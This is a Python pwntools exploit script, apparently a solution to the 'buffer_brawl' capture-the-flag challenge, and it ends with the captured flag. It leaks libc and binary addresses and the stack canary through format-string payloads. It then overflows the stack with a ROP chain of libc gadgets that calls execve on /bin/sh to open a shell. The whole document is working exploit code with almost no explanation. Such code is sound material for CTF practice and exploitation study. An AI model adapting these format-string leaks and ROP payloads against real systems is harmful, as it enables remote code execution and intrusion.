#!/usr/bin/env python3

from pwn import *

elf = ELF("./buffer_brawl_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
ld = ELF('ld-linux-x86-64.so.2')
libc = ELF("./libc.so.6")

gs = '''
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#


def start():
    if args.REMOTE:
        return remote("buffer-brawl.chal.wwctf.com", 1337)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)

#========= exploit here ===================
rcu(b">")

#leaks
#libc
sl(b"4")
payload = b"%3$p"
sla(b"Right or left?", payload)
r.recvline()
leak = int(r.recvline().strip(),16)
rcu(b">")
#
logleak("libc leak", leak)
#leak = leak -0x12
libc.address = leak - 0x1147e2
logbase()

#binary base
sl(b"4")
payload = b"%8$p"
sla(b"Right or left?", payload)
r.recvline()
bin_base = int(r.recvline().strip(),16) - 0x24e0
logleak("binary base", bin_base)

#canary
sl(b"4")
payload = b"%11$p"
sla(b"Right or left?", payload)
r.recvline()
canary = int(r.recvline().strip(),16)
logleak("canary", canary)

rcu(b">")

#overflow

for i in range(28):
    sl(b"3")
    rcu(b">")

sl(b"3")

#onegadgets = one_gadget('libc.so.6', libc.address)

poprdi = libc.address + 0x000000000002a3e5# pop rdi; ret;
ret = libc.address + 0x0000000000029139# ret;
#0x000000000002be51: pop rsi; ret;
poprsi = libc.address+0x2be51
#0x000000000011f2e7: pop rdx; pop r12; ret;
poprdxr12 = libc.address + 0x11f2e7
payload = b"A"*0x18
payload += p64(canary)
payload += b"BBBBBBBB" #rbp

payload += p64(poprdi)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(poprsi)
payload += p64(0)
payload += p64(poprdxr12)
payload += p64(0)
payload += p64(0)
payload += p64(ret)
payload += p64(libc.sym.execve)
log.info(f"system = {hex(libc.sym.execve)}")
sla(b"move:", payload)
#wwf{C0ngr4ts_t0_the_n3w_R0P4TT4CK_ch4mp10n_0f_th3_W0rld}


#========= interactive ====================
r.interactive()

'''
libc gadgets

0x000000000002a3e5: pop rdi; ret;
#0x000000000002be51: pop rsi; ret;
#0x000000000011f2e7: pop rdx; pop r12; ret;

'''